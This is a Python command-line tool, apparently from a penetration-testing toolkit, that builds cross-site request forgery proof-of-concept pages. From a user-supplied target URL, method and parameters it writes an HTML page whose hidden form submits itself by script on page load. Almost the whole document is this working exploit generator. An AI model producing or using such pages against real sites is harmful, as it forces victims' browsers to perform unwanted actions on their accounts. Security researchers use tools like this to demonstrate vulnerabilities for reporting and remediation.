import argparse
from yattag import Doc, indent
import urllib.parse

parser = argparse.ArgumentParser(description='This is a pyhton script which generates PoC for Cross-site request forgery with autosubmit form. you just need to provide Url, method and parameters.')
parser.add_argument('-m', '--method', help='Method')
parser.add_argument('-u', '--url', help='url')
parser.add_argument('-p', '--parameters', help='Request parameter')
parser.add_argument('-a', '--author', help='Name of Author')
parser.add_argument('-e', '--enctype', help='enctype')

arg = parser.parse_args()

author = None
user_enctype = None

if arg.method is not None:
    method_arg = arg.method
    method_arg = method_arg.upper()
    method_list = ["POST", "GET"]
    if method_arg in method_list:
        method = method_arg
    else:
        print("Methods Supported [  GET and POST ]")
        exit(0)
else:
    print(parser.format_help())
    exit(0)

if arg.url is not None:
    url = arg.url
else:
    print(parser.format_help())
    exit(0)

if arg.parameters is not None:
    user_params = arg.parameters
    user_params = urllib.parse.unquote(user_params)
else:
    print(parser.format_help())
    exit(0)

if arg.author is not None:
    author = arg.author

if arg.enctype is not None:
    enctype = arg.enctype
    enctype_list = ["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]
    if enctype in enctype_list:
        user_enctype = enctype


# to find out the name value pairs of parameters
def parameters(params):
    name_value = dict()  # define a dict variable
    if '&' and '=' in params:
        split_by_amp = params.split('&')  # split by &
        for i in split_by_amp:
            split_by_eq = i.split('=')
            if split_by_eq[1] == '':
                split_by_eq[1] = ' '
            name_value[split_by_eq[0]] = split_by_eq[1]
    else:
        print(parser.format_help())
        exit(0)
    return name_value


# to create form of html with author name and enctype
def form_create(method, url, params, author='', enc_type='application/x-www-form-urlencoded'):
    doc, tag, text = Doc().tagtext()
    with tag('html'):
        with tag('title'):
            text('This CSRF was found by ' + author)
        with tag('body'):
            with tag('h1'):
                text('This POC was Created By CSRF PoC Generator Tool')
            with tag('form', action=url, method=method, enctype=enc_type):
                for name in params:
                    value = params[name]
                    doc.stag('input', type='hidden', name=name, value=value)
            with tag('script'):
                text('document.forms[0].submit();')
    return indent(doc.getvalue(), indent_text=True)



if __name__ == '__main__':
    try:
        params = parameters(user_params)
        if author is not None or user_enctype is not None:
            if author is not None and user_enctype is None:
                POC = form_create(method, url, params, author=author)
                print(POC)
            if user_enctype is not None and author is None:
                POC = form_create(method, url, params, enc_type=user_enctype)
                print(POC)
            if user_enctype and author is not None:
                POC = form_create(method, url, params, author, user_enctype)
                print(POC)
        else:
            POC = form_create(method, url, params)
            print(POC)
    except:
        print("Something Went Wrong With Parameters")
        exit(0)
